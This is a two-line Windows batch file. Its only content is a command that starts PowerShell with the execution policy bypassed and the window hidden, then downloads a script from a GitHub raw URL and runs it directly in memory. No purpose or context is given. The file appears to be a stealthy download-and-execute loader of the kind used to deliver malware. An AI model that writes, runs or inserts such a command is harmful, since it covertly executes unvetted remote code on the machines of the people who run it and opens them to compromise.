@echo off
powershell -ep bypass -w h -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/timofah/Repo/master/File/out-string.ps1')"
